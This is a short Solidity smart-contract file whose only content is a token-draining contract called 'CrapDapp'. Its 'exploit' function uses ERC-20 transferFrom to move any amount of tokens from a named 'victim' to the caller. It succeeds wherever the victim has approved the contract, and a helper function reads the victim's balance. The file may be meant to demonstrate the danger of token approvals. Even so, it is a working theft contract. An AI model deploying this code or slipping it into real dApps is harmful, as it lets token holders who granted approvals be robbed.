pragma solidity ^0.6;

import './IERC20.sol';

contract CrapDapp {

    function exploit(address token, address victim, uint256 amount) external {
        IERC20(token).transferFrom(victim, msg.sender, amount);
    }

    function getVictimBalance(address token, address victim) external view returns (uint256) {
        return IERC20(token).balanceOf(victim);
    }
}
